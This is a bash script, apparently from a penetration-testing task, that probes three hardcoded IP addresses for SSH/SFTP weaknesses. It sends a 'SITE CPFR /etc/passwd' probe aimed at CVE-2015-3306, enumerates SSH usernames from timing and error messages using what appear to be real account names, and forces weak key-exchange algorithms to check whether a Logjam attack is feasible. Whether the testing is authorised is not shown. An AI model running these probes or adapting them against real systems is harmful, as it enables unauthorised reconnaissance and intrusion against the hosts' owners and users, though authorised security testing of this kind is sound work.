#!/usr/bin/env bash
# Task1 Attack Path Probing - using ssh CLI (bypasses paramiko weak-algorithm restrictions)
set -uo pipefail

# macOS doesn't have 'timeout' — provide a portable shim
if ! command -v timeout &>/dev/null; then
    timeout() {
        local secs=$1; shift
        local rc=0
        "$@" &
        local cmd_pid=$!
        ( sleep "$secs"; kill $cmd_pid 2>/dev/null ) &
        wait $cmd_pid 2>/dev/null || rc=$?
        return $rc
    }
fi

TARGETS="120.133.131.108 120.133.131.109 120.133.131.110"
WEAK_OPTS="-o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss -o PubkeyAcceptedAlgorithms=+ssh-rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10"

# Known and test usernames (from task2 baseline + common)
KNOWN_USERS="finance ops tms_cmb mms_cmb farms_warn_ruisuiyh farms_warn_dongyayh"
COMMON_USERS="root admin ftp anonymous proftpd sftp nobody"
FAKE_USERS="xyz_random_test_99 definitely_not_a_user"

echo "=== Test 1: SFTP SITE Command Probe ==="
echo "Testing if SITE CPFR/CPTO commands can be sent via SFTP channel"
echo

for TARGET in $TARGETS; do
    echo "Probing $TARGET..."
    # Try to open SFTP session and send SITE commands
    # Use a fake key to get past key exchange but fail auth
    TMPKEY=$(mktemp)
    # Ensure no stale keys from interrupted runs; -f forces overwrite without prompt
    rm -f "$TMPKEY" "$TMPKEY.pub"
    ssh-keygen -t rsa -f "$TMPKEY" -N "" -q 2>/dev/null

    # SITE CPFR test via SFTP
    echo "SITE CPFR /etc/passwd" | { timeout 15 sftp $WEAK_OPTS -i "$TMPKEY" -b - "probe@${TARGET}" 2>&1 || true; } | head -5
    echo

    rm -f "$TMPKEY" "$TMPKEY.pub"
done

echo "=== Test 2: SSH User Enumeration ==="
echo "Comparing auth failure messages and timing for different usernames"
echo

for TARGET in $TARGETS; do
    echo "Enumerating $TARGET..."

    TMPKEY=$(mktemp)
    # Ensure no stale keys from interrupted runs; -f forces overwrite without prompt
    rm -f "$TMPKEY" "$TMPKEY.pub"
    ssh-keygen -t rsa -f "$TMPKEY" -N "" -q 2>/dev/null

    echo "  --- Known users (from task2 baseline) ---"
    for USER in $KNOWN_USERS; do
        START=$(python3 -c "import time; print(time.time())")
        OUTPUT=$(timeout 10 ssh -vvv $WEAK_OPTS -i "$TMPKEY" "${USER}@${TARGET}" "exit" 2>&1)
        END=$(python3 -c "import time; print(time.time())")
        ELAPSED=$(python3 -c "print(f'{$END - $START:.3f}')")

        # Extract key auth messages
        MSG=$(echo "$OUTPUT" | grep -i "permission denied\|authentication failure\|publickey\|no more auth\|Disconnected" | head -2 | tr '\n' ' | ' || true)
        echo "    $USER (${ELAPSED}s): $MSG"
    done

    echo "  --- Common system users ---"
    for USER in $COMMON_USERS; do
        START=$(python3 -c "import time; print(time.time())")
        OUTPUT=$(timeout 10 ssh -vvv $WEAK_OPTS -i "$TMPKEY" "${USER}@${TARGET}" "exit" 2>&1)
        END=$(python3 -c "import time; print(time.time())")
        ELAPSED=$(python3 -c "print(f'{$END - $START:.3f}')")

        MSG=$(echo "$OUTPUT" | grep -i "permission denied\|authentication failure\|publickey\|no more auth\|Disconnected" | head -2 | tr '\n' ' | ' || true)
        echo "    $USER (${ELAPSED}s): $MSG"
    done

    echo "  --- Fake users (should not exist) ---"
    for USER in $FAKE_USERS; do
        START=$(python3 -c "import time; print(time.time())")
        OUTPUT=$(timeout 10 ssh -vvv $WEAK_OPTS -i "$TMPKEY" "${USER}@${TARGET}" "exit" 2>&1)
        END=$(python3 -c "import time; print(time.time())")
        ELAPSED=$(python3 -c "print(f'{$END - $START:.3f}')")

        MSG=$(echo "$OUTPUT" | grep -i "permission denied\|authentication failure\|publickey\|no more auth\|Disconnected" | head -2 | tr '\n' ' | ' || true)
        echo "    $USER (${ELAPSED}s): $MSG"
    done

    rm -f "$TMPKEY" "$TMPKEY.pub"
    echo
done

echo "=== Test 3: Host Key Analysis (from previous run) ==="
echo "Result: All 3 targets share RSA 2048-bit host key"
echo "  Fingerprint: SHA256:Ht7BR9NOXxsGMbzVEj0NThaMcOdg4Zt7+H8ERHIMBy8"
echo "  Risk: RSA 2048-bit is weak (not recommended), shared key means one crack = all 3 compromised"
echo

echo "=== Test 4: Algorithm Negotiation Detail ==="
echo "Forcing weakest algorithm combo to confirm Logjam feasibility"
echo

for TARGET in $TARGETS; do
    echo "Probing $TARGET with diffie-hellman-group1-sha1..."
    TMPKEY=$(mktemp)
    # Ensure no stale keys from interrupted runs; -f forces overwrite without prompt
    rm -f "$TMPKEY" "$TMPKEY.pub"
    ssh-keygen -t rsa -f "$TMPKEY" -N "" -q 2>/dev/null

    timeout 10 ssh -vvv \
        -o KexAlgorithms=diffie-hellman-group1-sha1 \
        -o HostKeyAlgorithms=ssh-rsa \
        -o Ciphers=aes128-cbc \
        -o MACs=hmac-md5 \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -i "$TMPKEY" \
        "probe@${TARGET}" "exit" 2>&1 | \
        grep -i "kex: algorithm\|kex: host key\|cipher:\|mac:\|debug: SSH2_MSG_KEXINIT\|negotiated" | head -10 || true

    rm -f "$TMPKEY" "$TMPKEY.pub"
    echo
done

echo "=== Summary ==="
echo "If SITE commands are accepted via SFTP -> CVE-2015-3306 exploitable on port 22"
echo "If different auth error messages/timing for different users -> enumeration possible"
echo "If weak algorithm negotiation succeeds -> Logjam attack feasible"